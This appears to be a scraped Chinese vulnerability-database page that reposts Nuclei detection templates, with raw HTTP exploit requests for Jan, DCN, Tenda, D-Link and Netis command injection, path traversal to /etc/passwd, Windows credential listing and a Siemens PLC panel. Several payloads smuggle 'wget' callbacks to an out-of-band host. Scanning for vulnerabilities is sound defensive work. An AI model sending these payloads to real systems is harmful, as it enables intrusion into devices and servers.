posts.text: 漏洞名称： Jan 任意文件读取漏洞 漏洞编号： CVE： CVE-2024-36857 漏洞类型： 文件读取 漏洞等级： 高危 漏洞描述： Jan v0.4.12被发现包含一个通过/v1/app/readFileSync接口的任意文件读取漏洞。 产品厂商： homebrew 产品名称： Jan 影响版本： 0.4.12 搜索语法： icon_hash=”-165268926” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/775950ad19e9675f3fcad5b799500d912bc9e453/http%2Fcves%2F2024%2FCVE-2024-36857.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051id: CVE-2024-36857info: name: Jan v0.4.12 - File Read author: pussycat0x severity: high description: | Jan v0.4.12 was discovered to contain an arbitrary file read vulnerability via the /v1/app/readFileSync interface. reference: - https://github.com/HackAllSec/CVEs/blob/main/Jan%20AFR%20vulnerability/README.md classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N cvss-score: 7.5 cve-id: CVE-2024-36857 epss-score: 0.00273 epss-percentile: 0.50483 cpe: cpe:2.3:a:homebrew:jan:0.4.12:*:*:*:*:*:*:* metadata: max-request: 1 fofa-query: icon_hash="-165268926" tags: cve,cve2024,kev,jan,lfihttp: - raw: - | POST /v1/app/readFileSync HTTP/1.1 Host: {{Hostname}} Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://{{RootURL}} contentType: application/json Content-Type: text/plain;charset=UTF-8 Content-Length: 48 Origin: http://{{RootURL}} Connection: close ["file:/../../../../../../etc/passwd","utf-8"] matchers-condition: and matchers: - type: regex part: body regex: - "root:.*:0:0:" - type: status status: - 200

posts.title: DCN DCBI-Netlog-LAB v1.0 认证绕过 - 命令执行
posts.text: 漏洞名称： DCN DCBI-Netlog-LAB v1.0 认证绕过 - 命令执行 漏洞编号： CVE： CVE-2023-26802 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 中的 /network_config/nsg_masq.cgi 组件存在漏洞，允许攻击者通过精心构造的请求绕过认证并执行任意命令。 产品厂商： dcnglobal 产品名称： dcbi-netlog-lab_firmware 影响版本： 1.0 来源： https://github.com/projectdiscovery/nuclei-templates/blob/3d9566e9a49e774dea5536f8ad4c52af67735b8f/http%2Fcves%2F2023%2FCVE-2023-26802.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364id: CVE-2023-26802info: name: DCBI-Netlog-LAB v1.0 authentication - Command Injection author: pussycat0x severity: critical description: | An issue in the component /network_config/nsg_masq.cgi of DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 allows attackers to bypass authentication and execute arbitrary commands via a crafted request. reference: - https://web.archive.org/web/20230605051153/https://github.com/winmt/my-vuls/tree/main/DCN%20DCBI-Netlog-LAB classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-26802 cwe-id: CWE-22 epss-score: 0.00433 epss-percentile: 0.61882 cpe: cpe:2.3:o:dcnglobal:dcbi-netlog-lab_firmware:1.0:*:*:*:*:*:*:* metadata: vendor: dcnglobal product: dcbi-netlog-lab_firmware tags: cve,cve2023,rce,unauth,kev.netlogvariables: file_name: "{{rand_text_alpha(4)}}.html"http: - raw: - | GET /cgi-bin/network_config/nsg_masq.cgi?user_name=admin&session_id=../&lang=zh_CN.UTF-8&act=2&proto=;ls>/usr/local/lyx/lyxcenter/web/{{file_name}}; HTTP/1.1 Host: {{Hostname}} Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close - | GET /{{file_name}} HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close matchers-condition: and matchers: - type: word part: body_2 words: - "nsg_bridge.cgi" - "nsg_dhcpactiveip.cgi" condition: and - type: status status: - 200

posts.title: Tenda AC15 AC1900 命令注入漏洞
posts.text: 漏洞名称： Tenda AC15 AC1900 命令注入漏洞 漏洞编号： CVE： CVE-2020-10987 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Tenda AC15 AC1900版本15.03.05.19的goform/setUsbUnload端点允许远程攻击者通过deviceName POST参数执行任意系统命令。 产品厂商： tenda 产品名称： ac15_firmware 影响版本： 15.03.05.19 来源： https://github.com/projectdiscovery/nuclei-templates/blob/27d5b118d02856f9de9e05e5f8c162e55397da7d/http%2Fcves%2F2020%2FCVE-2020-10987.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849id: CVE-2020-10987info: name: Tenda AC15 AC1900 version 15.03.05.19 - Command Injection author: pussycat0x severity: critical description: | The goform/setUsbUnload endpoint of Tenda AC15 AC1900 version 15.03.05.19 allows remote attackers to execute arbitrary system commands via the deviceName POST parameter. reference: - https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68 - https://www.ise.io/research/ - https://github.com/20142995/Goby - https://github.com/NyxAzrael/Goby_POC - https://github.com/Ostorlab/KEV classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2020-10987 cwe-id: CWE-78 epss-score: 0.90188 epss-percentile: 0.99558 cpe: cpe:2.3:o:tenda:ac15_firmware:15.03.05.19:*:*:*:*:*:*:* metadata: vendor: tenda product: ac15_firmware tags: cve,cve2020,tenda,rce,kev,unauthvariables: payload: "wget http://{{interactsh-url}}"http: - raw: - | POST /goform/setUsbUnload HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Accept: */* deviceName=test`;{{payload}};` matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http"

posts.title: Windows Unquoted Service Path Vulnerability
posts.text: 漏洞名称： Windows Unquoted Service Path Vulnerability 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： Windows中的未加引号的服务路径漏洞发生在服务安装时使用包含空格但没有正确引号的路径。如果攻击者获得服务安装目录的写入权限，他们可以以提升的权限执行恶意代码。 产品厂商： Microsoft 产品名称： Windows 来源： https://github.com/projectdiscovery/nuclei-templates/blob/3f39e2c9c28e98ee064f244a19e797fe7e216178/code%2Fwindows%2Funquoted-service-pathcheck.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455id: unquoted-service-pathcheckinfo: name: Unquoted Service PathCheck author: pussycat0x severity: high description: | The Unquoted Service Path vulnerability in Windows occurs when services are installed using paths containing spaces without proper quotation marks. If attackers obtain write permissions in the service's installation directory, they can execute malicious code with elevated privileges. tags: code,windows,privesc,psself-contained: truecode: - engine: - powershell - powershell.exe args: - -ExecutionPolicy - Bypass - -File pattern: "*.ps1" source: | Write-Host "Fetching the list of services, this may take a while..."; # Get the list of services that meet the criteria $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and # Service path does not contain quotes $_.PathName -inotmatch ":\\Windows\\" -and ($_.StartMode -eq "Auto" -or $_.StartMode -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") }; # Check if any services meet the criteria if ($($services | Measure-Object).Count -lt 1) { Write-Host "No unquoted service paths were found."; } else { Write-Host "Unquoted service paths were found:"; foreach ($service in $services) { Write-Host "Service Name: $($service.Name)"; Write-Host "Display Name: $($service.DisplayName)"; Write-Host "Path: $($service.PathName)"; Write-Host "----------------------------------"; } } extractors: - type: dsl dsl: - response

posts.title: Windows Get Stored Credentials - cmdkey Vulnerability
posts.text: 漏洞名称： Windows Get Stored Credentials - cmdkey Vulnerability 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： Windows中的cmdkey /list命令用于列出系统上存储的所有凭据。这些凭据可以包括为网络资源、网站或远程计算机保存的用户名和密码。 产品厂商： Microsoft 产品名称： Windows 来源： https://github.com/projectdiscovery/nuclei-templates/blob/36e1d90f0095039e17a3176d3561f403cd216480/code%2Fwindows%2Fget-stored-credentials-cmdkey.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930id: get-stored-credentials-cmdkeyinfo: name: Get Stored Credentials - cmdkey author: pussycat0x severity: high description: | The cmdkey /list command in Windows is used to list all the stored credentials on the system. These credentials can include saved usernames and passwords for network resources, websites, or remote computers tags: code,windows,privesc,psself-contained: truecode: - engine: - powershell - powershell.exe args: - -ExecutionPolicy - Bypass - -File pattern: "*.ps1" source: | cmdkey /list extractors: - type: dsl dsl: - response

posts.title: Jan 任意文件上传漏洞
posts.text: 漏洞名称： Jan 任意文件上传漏洞 漏洞编号： CVE： CVE-2024-36858 漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Jan v0.4.12中的/v1/app/writeFileSync接口存在任意文件上传漏洞，攻击者可通过上传特制文件执行任意代码。 产品厂商： homebrew 产品名称： Jan 影响版本： 0.4.12 搜索语法： icon_hash=”-165268926” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/eaf2fd04f263e1056529d8de88f93ade97188f3a/http%2Fcves%2F2024%2FCVE-2024-36858.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576id: CVE-2024-36858info: name: Jan v0.4.12 - Arbitrary File Upload author: pussycat0x severity: critical description: | An arbitrary file upload vulnerability in the /v1/app/writeFileSync interface of Jan v0.4.12 allows attackers to execute arbitrary code via uploading a crafted file. reference: - https://github.com/HackAllSec/CVEs/blob/main/Jan%20AFR%20vulnerability/README.md classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2024-36858 cwe-id: CWE-434 epss-score: 0.0363 epss-percentile: 0.87242 cpe: cpe:2.3:a:homebrew:jan:0.4.12:*:*:*:*:*:*:* metadata: fofa-query: icon_hash="-165268926" tags: cve,cve2024,kev,totolink,unauth,intrusivehttp: - | POST /v1/app/appendFileSync HTTP/1.1 Host: {{Hostname}} Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://{{RootURL}} contentType: application/json Content-Type: text/plain;charset=UTF-8 Content-Length: 48 Origin: http://{{RootURL}} Connection: close ["file:/../../../../../../tmp/{{randstr}}.txt","{{randstr}}"] - | POST /v1/app/readFileSync HTTP/1.1 Host: {{Hostname}} Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://{{RootURL}} contentType: application/json Content-Type: text/plain;charset=UTF-8 Content-Length: 48 Origin: http://{{RootURL}} Connection: close ["file:/../../../../../../tmp/{{randstr}}.txt","utf-8"] matchers: - posts.title: Siemens SIMATIC 300 未授权访问漏洞
posts.text: 漏洞名称： Siemens SIMATIC 300 未授权访问漏洞 漏洞类型： 未授权访问 漏洞等级： 高危 漏洞描述： 发现Siemens SIMATIC S7-300的未授权暴露的Web界面，可能允许无需任何登录凭证即可访问。 产品厂商： Siemens 产品名称： SIMATIC S7-300 搜索语法： title:”SIMATIC 300” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/48a4b2d60a87cef10999e5e5443004cb66ffc80d/http%2Fmisconfiguration%2Fsimatic-300-unauth.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839id: simatic-300-unauthinfo: name: Siemens SIMATIC 300 - Unauthenticated Dashboard author: Th3l0newolf severity: high description: | An unauthenticated exposed web interface for Siemens SIMATIC S7-300 was discovered, potentially allowing access without any login credentials. reference: - https://new.siemens.com metadata: verified: true shodan-query: title:"SIMATIC 300" max-request: 1 tags: siemens,simatic,plc,scada,iot,misconfig,unauthhttp: - method: GET path: - "{{BaseURL}}/Portal0000.htm" matchers-condition: and matchers: - type: regex part: body regex: - "SIMATIC\\s*300" - type: word part: body words: - 'alt="Simatic S7 CP"' - type: status status: - 200

posts.title: D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection
posts.text: 漏洞名称： D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection 漏洞编号： CVE： CVE-2023-25280 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： D-Link DIR820LA1_FW105B03存在操作系统命令注入漏洞，攻击者可以通过ping_addr参数向ping.ccp发送精心构造的负载，从而将权限提升至root。 产品厂商： dlink 产品名称： dir820la1_firmware 影响版本： 105b03 来源： https://github.com/projectdiscovery/nuclei-templates/blob/af2dc2f3ed670a468321d4e4fa8ad2c501b9fea3/http%2Fcves%2F2023%2FCVE-2023-25280.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758id: CVE-2023-25280info: name: D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection author: pussycat0x severity: critical description: | OS Command injection vulnerability in D-Link DIR820LA1_FW105B03 allows attackers to escalate privileges to root via a crafted payload with the ping_addr parameter to ping.ccp. reference: - https://github.com/migraine-sudo/D_Link_Vuln/tree/main/cmd%20Inject%20in%20pingV4Msg - https://www.dlink.com/en/security-bulletin/ - https://github.com/Ostorlab/KEV classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-25280 cwe-id: CWE-78 epss-score: 0.8918 epss-percentile: 0.99516 cpe: cpe:2.3:o:dlink:dir820la1_firmware:105b03:*:*:*:*:*:*:* metadata: vendor: dlink product: dir820la1_firmware tags: cve,cve2023,rce,unauth,kev,dlinkvariables: payload: "wget http://{{interactsh-url}}"http: - raw: - | POST /ping.ccp HTTP/1.1 Host: {{Hostname}} Content-Length: 760 Accept: application/xml, text/xml, */*; q=0.01 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded Origin: http://{{RootURL}} Referer: http://{{BaseURL}}/lan.asp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: hasLogin=1 Connection: close ccp_act=pingV4Msg&ping_addr=%0a{{payload}}%0a matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: Netis MW5360 命令注入漏洞
posts.text: 漏洞名称： Netis MW5360 命令注入漏洞 漏洞编号： CVE： CVE-2024-22729 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： NETIS SYSTEMS MW5360 V1.0.1.3031 在登录页面的密码参数中发现了一个命令注入漏洞。 产品厂商： netis-systems 产品名称： mw5360_firmware 影响版本： 1.0.1.3031 搜索语法： title:”netis router” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/382ed829e63c820fc90a63f51e74a3633154a44b/http%2Fcves%2F2024%2FCVE-2024-22729.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859id: CVE-2024-22729info: name: Netis MW5360 V1.0.1.3031 - Command Injection author: pussycat0x severity: critical description: | NETIS SYSTEMS MW5360 V1.0.1.3031 was discovered to contain a command injection vulnerability via the password parameter on the login page. reference: - https://github.com/adhikara13/CVE/blob/main/netis_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2024-22729 cwe-id: CWE-77 epss-score: 0.56498 epss-percentile: 0.97972 cpe: cpe:2.3:o:netis-systems:mw5360_firmware:1.0.1.3031:*:*:*:*:*:*:* metadata: vendor: netis-systems product: mw5360_firmware shodan-query: title:"netis router" tags: cve,cve2024,rce,kev,netis,unauthvariables: payload: "wget http://{{interactsh-url}}"flow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - 'contains(body,"netis router")' - 'status_code == 200' condition: and internal: true - raw: - | POST /cgi-bin/skk_set.cgi HTTP/1.1 Host: {{Hostname}} Connection: close password={{base64("{{payload}}")}}&quick_set=ap&app=wan_set_shortcutz matchers: - type: word part: interactsh_protocol words: - "http"

posts.title: Roundcube Webmail PHP对象反序列化漏洞
posts.text: 漏洞名称： Roundcube Webmail PHP对象反序列化漏洞 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program/actions/settings/upload.php中的_from参数未经过验证，导致认证用户可以通过URL执行远程代码，引发PHP对象反序列化漏洞。 产品厂商： roundcube 产品名称： webmail 影响版本： version < 1.5.10 or (version >= 1.6.0 and version < 1.6.11) 来源： https://github.com/projectdiscovery/nuclei-templates/blob/5668dae24feb7dd044a1f11d9d72394b9af76cbe/http%2Fcves%2F2025%2FCVE-2025-49113.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980id: CVE-2025-49113info: name: CVE-2025-49113 author: Ademking severity: critical description: > Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization. reference: - 'https://nvd.nist.gov/vuln/detail/CVE-2025-49113' - 'https://github.com/advisories/GHSA-8j8w-wwqc-x596' - 'https://fearsoff.org/research/roundcube' - 'http://www.openwall.com/lists/oss-security/2025/06/02/3' - 'https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10' classification: cvss-metrics: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H' cvss-score: 10 cve-id: CVE-2025-49113 cwe-id: CWE-502 metadata: vendor: roundcube product: webmail tags: 'roundcube,portal,tech'http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers-condition: and matchers: - type: word words: - Roundcube - roundcube condition: or part: body - type: regex regex: - '"rcversion":\d\d\d\d' condition: or part: body extractors: - type: regex name: major group: 1 regex: - '"rcversion":(\d)' internal: true - type: regex name: minor group: 1 regex: - '"rcversion":\d\d(\d)' internal: true - type: regex name: patch group: 1 regex: - '"rcversion":\d\d\d(\d+)' internal: true - type: dsl name: version dsl: - major + "." + minor + "." + patch internal: true - type: dsl name: vulnerable dsl: - >- compare_versions(version, '< 1.5.10') || (compare_versions(version, '>= 1.6.0') && compare_versions(version, '< 1.6.11')) internal: true - type: dsl dsl: - '"Version: " + version'

posts.title: Roundcube Post-Authentication Remote Code Execution Vulnerability
posts.text: 漏洞名称： Roundcube Post-Authentication Remote Code Execution Vulnerability 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Roundcube <= 1.6.10版本存在一个严重的反序列化漏洞，允许经过身份验证的攻击者执行远程代码。该漏洞的CVSS评分为10.0，影响范围广泛，已在Roundcube 1.6.11和1.5.10 LTS版本中修复。 产品厂商： Roundcube 产品名称： Roundcube 影响版本： <= 1.6.10 来源： https://github.com/Ademking/CVE-2025-49113-nuclei-template 类型： CVE-2025:github search 12345678910111213141516171819# Nuclei vulnerability detection template - CVE-2025-49113 - Roundcube ≤ 1.6.10 Post-Authentication Remote Code Execution![](https://i.imgur.com/ejVwHRD.png)**CVE ID:** CVE-2025-49113 **Severity:** Critical (CVSS 10.0) **Discovered by:** Kirill Firsov (FearsOff) **Date Disclosed:** June 1, 2025 **Fixed in:** Roundcube 1.6.11 / 1.5.10 LTS - https://nvd.nist.gov/vuln/detail/CVE-2025-49113 - https://github.com/advisories/GHSA-8j8w-wwqc-x596 - https://fearsoff.org/research/roundcube - http://www.openwall.com/lists/oss-security/2025/06/02/3 - https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10 - CVE-2025-49113.yaml - README.md```
